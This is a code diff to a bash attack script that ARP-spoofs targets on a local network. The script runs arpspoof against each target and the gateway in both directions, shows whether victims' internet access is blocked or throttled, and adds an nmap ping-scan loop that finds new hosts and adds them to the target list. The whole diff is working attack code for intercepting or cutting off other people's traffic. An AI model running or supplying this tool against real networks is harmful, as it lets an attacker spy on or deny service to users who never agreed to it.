@@ -425,7 +425,8 @@ func_start_attack()
 
     echo -e " +"
     echo -e " | Target Network      : $NETWORK"
-    echo -e " | Bandwidth Limit     : $RATE_LIMIT"
+    echo -ne " | Bandwidth Limit     : "
+    [[ $FORWARD_TRAFFIC == true ]] && echo -e "$RATE_LIMIT" || echo -e "Internet access blocked!"
     echo -e " | Excluded IP Address : $EXCLUDED_IP"
     echo -e " +"
     echo -e ""
@@ -443,16 +444,33 @@ func_start_attack()
     fi
 
     # Start the ARP Spoofing and print the output
-    echo -e "[*] Attack Output:\n"
+    echo -e "[*] Log:\n"
 
     for IP in $TARGET_IP
     do
-        arpspoof -t $IP $GATEWAY &
-        arpspoof -t $GATEWAY $IP &
+        echo -e "[$(date '+%T')] Spoofing target: $IP"
+        arpspoof -t $IP $GATEWAY > /dev/null 2>&1 &
+        arpspoof -t $GATEWAY $IP > /dev/null 2>&1 &
     done
 
-    # Loop so that the script isn't exit yet :v
-    while true; do sleep 1; done
+    # Loop and discover new targets
+    while true
+    do
+        NEW_SCAN=$(nmap -sn $NETWORK | grep "for" | cut -d ' ' -f 5-)
+
+        while read -r RESULT
+        do
+            IP=$(echo $RESULT | cut -d '(' -f2 | cut -d ')' -f1)
+
+            if echo "$EXCLUDED_IP $GATEWAY" | grep -qw "$IP"; then continue; fi
+
+            if ! echo $TARGET_IP | grep -qw "$IP"
+            then
+                echo -e "[$(date '+%T')] Discovered new target: $IP"
+                TARGET_IP="$TARGET_IP $IP"
+            fi
+        done < <(echo "$NEW_SCAN")
+    done
 }
 
 start_interactive_mode()
